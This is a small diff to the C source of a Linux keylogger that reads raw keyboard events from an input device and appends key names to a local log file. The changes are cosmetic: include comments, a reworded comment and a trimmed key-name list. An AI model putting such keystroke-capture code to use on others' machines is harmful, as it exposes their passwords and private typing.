@@ -3,12 +3,11 @@
 */
 
 // Necessary includes from standard C libraries
-#include <stdio.h>
-#include <stdlib.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <linux/input.h>
-#include <string.h>
+#include <stdio.h>       // Needed for file operations (e.g., fopen, fprintf)
+#include <stdlib.h>      // Needed for memory management and exit()
+#include <fcntl.h>       // Needed for open() and file descriptor flags (e.g., O_RDONLY)
+#include <unistd.h>      // Needed for close(), read(), and other POSIX functions
+#include <linux/input.h> // Needed for the input_event struct and EV_KEY definitions
 
 // Constants
 #define KEYBOARD_DEVICE "/dev/input/event23" // Replace the event the actual event number for your keyboard (see /dev/input/by-path)...
@@ -17,7 +16,7 @@
 #define LOG_FILE_PATH "keylog.txt"
 
 /*
- * Log keys
+ * Log keys into file
 */
 void log_key(const char *filename, const char *key) {
     FILE *file = fopen(filename, "a");
@@ -65,7 +64,7 @@ const char* get_key_name(int key_code) {
         "MEDIA", "SWITCHVIDEOMODE", "KBDILLUMTOGGLE", "KBDILLUMDOWN", "KBDILLUMUP",
         "SEND", "REPLY", "FORWARDMAIL", "SAVE", "DOCUMENTS", "BATTERY", "BLUETOOTH",
         "WLAN", "UWB", "UNKNOWN", "VIDEO_NEXT", "VIDEO_PREV", "BRIGHTNESS_CYCLE",
-        "BRIGHTNESS_AUTO", "DISPLAY_OFF", "WWAN", "RFKILL", "MICMUTE", /* Extend if needed */
+        "BRIGHTNESS_AUTO", "DISPLAY_OFF", "WWAN", "RFKILL", "MICMUTE" 
     };
 
     if (key_code >= 0 && key_code < sizeof(key_names) / sizeof(key_names[0])) {
